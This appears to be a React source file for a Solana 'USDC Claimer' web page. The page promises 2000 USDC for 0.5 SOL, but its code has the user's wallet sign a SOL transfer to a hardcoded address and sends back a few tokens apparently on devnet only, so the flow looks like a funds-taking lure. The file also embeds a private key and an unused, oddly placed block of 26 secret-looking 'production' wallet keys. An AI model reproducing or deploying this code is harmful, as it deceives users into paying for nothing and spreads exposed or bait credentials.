/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4FJ5zDwAMesqfeMqdYj87H6qMiothB8xn7gdDNUfSeNKUF8VRGiwecH5yLQuK8UcoAxPRYP7Sn7DYaYaUQqW4Ah2"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5cKgq9f65aQrj25tFCd1faYwLFh3rXz1PB73a7nq5KgAspHmEhwjTrUb4xCBduhGgfz92HDNyq2Ep2umTNuNhc7K",
  "key1": "3dp8QRuWsZUXAKdTqqEBhcjR5t3NDLmVqAWuEytsxVTJhBemi7h7WvniGPouYxB3m2E22HhPwZYVi9Ezf6GAcz7F",
  "key2": "1syXCDN875PdvKP8U2CqTvLisxc576ACSDwmvHj2wj2PrqYVtUKKSsoxyjM6cVDC4xbpneFCqF8k1TpuHWqsRWT",
  "key3": "3eNWp5mVznp1EkhD7hh22BiH5yfv4GR1mouBDkTnZYMAGUKRqCNyqFVgxnG27YSMK8YXfTitW1qBzx9vWuwYf659",
  "key4": "5BXE9F4kC9L5HNMHNoLY6rUsymMXjwWnx1EDwzNauBPbpLKr24ToQCQH7XZyus5hEpzx4LNozj2LroNQ9ryWNK4f",
  "key5": "ghAa1j8A2zaaqivUivrrVuH83fGhU2dSM1HSZY2DuHCP5Mxj2ejoN3FC5Qz9cJzTMPgZCbCrKySDkuCi973NmLd",
  "key6": "3w2n9T8bneQDGJGSqDsZ7F4ykLGMLZR1PtTMc2uckxrrpoqz1HT6qvEuZToBDALYzPYVWP6LZUwZM6Ncqn5mA9sG",
  "key7": "4HiTexRQT4mbhPweskU1p9nDjg8obPSnJupDgtq2o9MmXa33GSuE91R62wyGRJouHEA9BDK2zmtRZsmv9HJZkEjf",
  "key8": "5rPpBSvBDcX5MRhysCSvQ61ihb7unXTCy9LwruUahdPFDgtUH5kroph3hhQgqH67Efzn1WWzPf6Jn5YUjTpsSr3S",
  "key9": "g3ovAG5NJSoiL4fHmE1vzga4R2nmWpyZWmsyeeNRb8rXD7mqEWHMDvjo6WMus2gVD5YkmZ3V95hwFnS3MHqHvaJ",
  "key10": "34CmAkfkkQPMifprcNVCicFZjKd1AjVtievvu49mkYTxot3tVMdY6bNMyRKaoNRMpTdVMMVJi3ZfRSEbcNvkRBAx",
  "key11": "5CBnT5G8kM9kVx8Ty9Rx2GTkYpVhSUaYgy59gTNjxotBRmE9DJqZ1XpzDqQqt1gztoHyjH6kC2MDZ7oVWjUPt9VZ",
  "key12": "3Tqec6QPAKrpYqshBsJGS8yKAVaRqM3FiwTjKQeC3cmMqdJmmZvp314PrqepskvqKjYwdKFCKnLsovPeZxfXoofm",
  "key13": "4yjBpvZ9sZCyoRX1xTMnXsHaAhvzevi7fSbNmm2V6vj9okBqGtn49gzb2BAQAoe73CnfgueatsXMP4gepRLy2ZcZ",
  "key14": "4ASbWDQhpRsCbWH2PqtnNjwLLdXUV7outUHmVmGajbMhisaLLLDd7vnxp6ThN5a8FpKtH7aVbata9D725vvLr3LT",
  "key15": "2eUUNWXixXnS5y1qpt5bjXFSCuMiMSZ5HBNUthXqHskTcq3eajGWUaSAH8XjXy3KgUbiUfKosgy2fF1mtvaeJGxs",
  "key16": "3f1zAyH8GBMSoBoDgkNNLG5vVWeQBVgGbLdCdjVTrXf1FZRaFnf6dSFdxG3o959W1vxoV5NpQw6Hxy2mJscuhhbt",
  "key17": "3ZWSvBELB8HPkxXQNvbDkqretcUiuxUTzYzZyEYCpgQHiUSy7cNTu6kRcnuK7bn9RcjqNbbEghuAT5dgRzufr4Uw",
  "key18": "V3QUSkDrZPYDZACQgqNKKn6S39QEX7VeWS8uswZo3F75KWgW2if16WLedsEwh15mRL4hmUej3jJdnSE2WukzqjF",
  "key19": "42zFLyAhG6HxK9XcdSaeCdZvkaJ9d5WWBwAeE46wZgSaeyZyhXhyK2q4aytUQ5c13yPW8hzmczo69ALXhYACkF97",
  "key20": "DAgoXLzfP2MetmBABL4BNumhs9oJmmd5ghenb7cDsnEMqjwHytN1z3H1t9zVcCm3sgo5tZD5RgKhj4hezJZbpfG",
  "key21": "3ybe87FVQySAzExULpe4ompTPWV9udf9KCctxX4wX3SqQTZgsXBftqFhLT63zEPfXFLz7m2zQfbPpmSdBhNqZ9kv",
  "key22": "5Vngsdhie1TUQsDrDB3d4wjLiqcjk9rucL29s88bNEGjz6Kv9dSTTVfsx36VtzUkxsncREbNcVwKojaGmgKJWXvj",
  "key23": "3RAEbryFPiRmzMobP4jfdkYuswNWAsPN78hVmrmYprV1ukuJeLZjoKY8DBZSXLrsGCQpDM7xxsyXvLX9y3w2vXiT",
  "key24": "49cKGniKvLGjZq7vEgBeGsgp4Ngxp3Goq5Kyeakt7Yp961QwdTWvFasHvUAx3HmsHdHYLigDcEByJdPeeNHGGcBz",
  "key25": "3A9JwK67khkfkyAE5ekHc9hx2THC6Wiz4o2xmUT4S4Ego9VQaqcqCYJdvjXFNcYWA6aSJCrEfAdYnkRe5cQQ2tmP"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
